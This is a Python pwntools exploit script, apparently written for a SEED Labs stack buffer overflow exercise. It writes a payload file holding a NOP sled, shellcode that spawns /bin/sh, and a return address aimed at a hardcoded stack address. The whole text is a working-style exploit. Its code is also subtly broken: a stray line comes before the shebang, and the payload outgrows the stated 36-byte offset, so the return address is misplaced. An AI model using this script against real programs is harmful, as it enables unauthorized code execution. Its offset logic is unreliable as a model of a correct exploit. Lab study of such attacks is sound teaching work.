buffer_addr = 0xffffcce8#!/usr/bin/env python3
from pwn import *

# Target binary
binary = '../vulnerable-programs/seedlabs-stack/stack'

# Addresses we found in GDB
buffer_addr = 0xffffcce8  # Where our shellcode will go
ret_offset = 36           # Bytes from buffer start to return address

# Generate shellcode to spawn /bin/sh
shellcode = asm(shellcraft.i386.linux.sh(), arch='i386')
print(f"[+] Shellcode length: {len(shellcode)} bytes")

# Build payload
nop_sled = b'\x90' * 100  # NOP sled for reliability
payload = nop_sled + shellcode

# Padding to reach return address (36 bytes total - payload length)
padding_needed = ret_offset - len(payload)
if padding_needed > 0:
    payload += b'A' * padding_needed

# Overwrite return address to point into NOP sled
# Point to middle of NOP sled for safety
ret_addr = buffer_addr + 50  # Jump into middle of NOPs
payload += p32(ret_addr)

# Fill rest with padding (up to 517 bytes that program reads)
payload += b'C' * (517 - len(payload))

print(f"[+] Payload length: {len(payload)} bytes")
print(f"[+] Return address: {hex(ret_addr)}")
print(f"[+] Writing to badfile...")

# Write to badfile
with open('../vulnerable-programs/seedlabs-stack/badfile', 'wb') as f:
    f.write(payload)

print("[+] Exploit ready! Run: cd ../vulnerable-programs/seedlabs-stack && ./stack")
